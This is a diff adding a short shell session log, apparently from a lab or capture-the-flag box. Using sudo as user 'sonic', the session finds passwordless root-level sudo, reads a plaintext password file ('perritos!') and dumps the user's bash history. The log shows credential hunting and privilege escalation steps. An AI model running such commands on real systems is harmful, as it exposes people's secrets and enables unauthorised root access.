@@ -1,0 +1,33 @@
+$ sudo -n -u sonic id
+uid=1001(sonic) gid=1001(sonic) groups=1001(sonic),27(sudo)
+$ sudo -n -u sonic sudo -n -l
+User sonic may run the following commands on 378958b2c98e:
+    (ALL) NOPASSWD: ALL
+$ sudo -n -u sonic ls -la /home/sonic
+total 36
+drwxr-x--- 4 sonic sonic 4096 Oct 29  2024 .
+drwxr-xr-x 1 root  root  4096 Oct 29  2024 ..
+-rw------- 1 sonic sonic   72 Oct 29  2024 .bash_history
+-rw-r--r-- 1 sonic sonic  220 Mar 31  2024 .bash_logout
+-rw-r--r-- 1 sonic sonic 3771 Mar 31  2024 .bashrc
+drwx------ 2 sonic sonic 4096 Oct 29  2024 .cache
+-rw-r--r-- 1 sonic sonic  807 Mar 31  2024 .profile
+-rw-r--r-- 1 sonic sonic    0 Oct 29  2024 .sudo_as_admin_successful
+drwxr-xr-x 2 sonic sonic 4096 Oct 29  2024 Documentos
+$ sudo -n -u sonic ls -la /home/sonic/Documentos
+total 12
+drwxr-xr-x 2 sonic sonic 4096 Oct 29  2024 .
+drwxr-x--- 4 sonic sonic 4096 Oct 29  2024 ..
+-rw-r--r-- 1 sonic sonic   10 Oct 29  2024 contraseña
+$ sudo -n -u sonic cat /home/sonic/Documentos/contraseña
+perritos!
+$ sudo -n -u sonic cat /home/sonic/.bash_history
+ls
+cd Documentos
+ls
+cat contrasena
+sudo -l
+sudo -i
+sudo -l
+sudo -i
+exit
